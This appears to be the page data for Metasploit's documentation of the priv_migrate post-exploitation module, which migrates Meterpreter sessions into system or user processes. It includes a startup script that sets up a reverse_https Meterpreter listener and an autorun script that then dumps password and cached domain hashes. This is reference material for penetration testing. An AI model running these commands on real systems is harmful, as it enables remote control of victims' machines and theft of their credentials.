{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/post/windows/manage/priv_migrate","result":{"data":{"moduleMetadataJson":{"id":"0d547bf0-9408-5990-9c9d-01d8f6bfae37","name":"Windows Manage Privilege Based Process Migration ","fullname":"post/windows/manage/priv_migrate","description":"This module will migrate a Meterpreter session based on session privileges.\n         It will do everything it can to migrate, including spawning a new User level process.\n         For sessions with Admin rights: It will try to migrate into a System level process in the following\n         order: ANAME (if specified), services.exe, wininit.exe, svchost.exe, lsm.exe, lsass.exe, and winlogon.exe.\n         If all these fail and NOFAIL is set to true, it will fall back to User level migration. For sessions with User level rights:\n         It will try to migrate to a user level process, if that fails it will attempt to spawn the process\n         then migrate to it. It will attempt the User level processes in the following order:\n         NAME (if specified), explorer.exe, then notepad.exe.","rank":300,"fields":{"detailsSlug":"/modules/details/post/windows/manage/priv_migrate","documentationSlug":"/modules/documentation/post/windows/manage/priv_migrate","referencesSlug":"/modules/references/post/windows/manage/priv_migrate"},"documentation":{"html":"<h2 id=\"overview\" style=\"position:relative;\"><a href=\"#overview\" aria-label=\"overview permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Overview</h2>\n<p>This module evaluates a Windows Meterpreter session's privileges and migrates the session accordingly. The purpose of this module is to enable the scripting of migrations post exploitation, which allows you to immediately run post modules that require system rights.  </p>\n<p>You can use this module in situations where incoming sessions may have mixed rights levels and the session needs to be migrated appropriately for additional post modules to run. It is also useful in situations where migration needs to occur within a short period after the session is created. </p>\n<p>The types of migrations that occur are described below: </p>\n<ul>\n<li>A session with admin rights is migrated to a system owned process. </li>\n<li>A session with user rights is migrated to a user level process. If a specified user level process is not running, the module will spawn it and then migrate the session. </li>\n</ul>\n<p>This module is a nice addition to the beginning of an autorun script for post-Meterpreter session creation. An example of an autorun script is provided below.</p>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<ul>\n<li><strong>ANAME</strong> - This option allows you to specify a system level process that the module attempts to migrate to first if the session has admin rights. </li>\n<li><strong>NAME</strong> - This option allows you to specify the user level process that the module attempts to migrate to first if the session has user rights or if admin migration fails through all of the default processes.  </li>\n<li><strong>KILL</strong> - This option allows you to kill the original process after a successful migration. The default value is FALSE.</li>\n<li><strong>NOFAIL</strong> - This option allows you to specify whether or not the module will migrate the session into a user level process if admin level migration fails. If TRUE, this may downgrade priviliged shells. The default value is FALSE.</li>\n</ul>\n<h2 id=\"module-process\" style=\"position:relative;\"><a href=\"#module-process\" aria-label=\"module process permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Module Process</h2>\n<p>Here is the process that the module follows:</p>\n<ul>\n<li>Retrieves the privilege information for the current session.</li>\n<li>\n<p>If the session has admin rights, it attempts to migrate to a system owned process in the following order:</p>\n<ul>\n<li>ANAME (Module option, if specified)</li>\n<li>services.exe</li>\n<li>wininit.exe</li>\n<li>svchost.exe</li>\n<li>lsm.exe</li>\n<li>lsass.exe</li>\n<li>winlogon.exe</li>\n</ul>\n</li>\n<li>The module will not migrate if the session has System rights and is already in one of the above target processes.</li>\n<li>If it is unable to migrate to one of these processes, it drops to user level migration if NOFAIL is TRUE.</li>\n<li>\n<p>If the session has user rights, it attempts to migrate to a user owned process in the following order:  </p>\n<ul>\n<li>NAME (Module option, if specified)</li>\n<li>explorer.exe</li>\n<li>notepad.exe</li>\n</ul>\n</li>\n<li>If it cannot migrate, it attempts to spawn the process and migrates to the newly spawned process.</li>\n</ul>\n<h2 id=\"using-this-module-with-autorun-scripts\" style=\"position:relative;\"><a href=\"#using-this-module-with-autorun-scripts\" aria-label=\"using this module with autorun scripts permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Using This Module with AutoRun Scripts</h2>\n<p>The use of autorun scripts with this module is an easy way to automate post-exploitation for incoming Meterpreter sessions. The following section describes the basic setup information and provides a script example to show how this module comes in handy.</p>\n<h3 id=\"basic-setup-information\" style=\"position:relative;\"><a href=\"#basic-setup-information\" aria-label=\"basic setup information permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Basic Setup Information</h3>\n<p>Resource file (.rc) scripts can be used to automate many processes in Metasploit, particularly starting up the  console and running scripts once a session is created.</p>\n<p>Startup scripts are executed using the following example where startup.rc is the startup script, and it is located in the user's home directory. Startup scripts are executed once the Metasploit Framework is loaded.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">./msfconsole -r /home/user/startup.rc</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>The following is an example startup script that fires up a Meterpreter listener and specifies an autorun script that will be executed when a new session is created. In this example auto.rc is the script to be run after session creation.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">use exploit/multi/handler\nset PAYLOAD windows/meterpreter/reverse_https\nset LHOST 192.168.1.101\nset LPORT 13002\nset ExitOnSession false\nset AutoRunScript multi_console_command -r /home/user/auto.rc\nexploit -j</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"autorun-script-example\" style=\"position:relative;\"><a href=\"#autorun-script-example\" aria-label=\"autorun script example permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>AutoRun Script Example</h3>\n<p>This example is a script that will use priv<em>migrate to migrate the session based on session rights. After migration, it executes modules that will retrieve user password hashes and cached domain hashes. Each one of the hash dump modules requires system rights to be successful. Priv</em>migrate makes it possible to execute these modules in an autorun script. For sessions with user rights, the hash dump modules will fail, but that is unlikely to impact the state of the session.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">run post/windows/manage/priv_migrate\nrun post/windows/gather/hashdump\nrun post/windows/gather/cachedump</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"0d547bf0-9408-5990-9c9d-01d8f6bfae37"}}}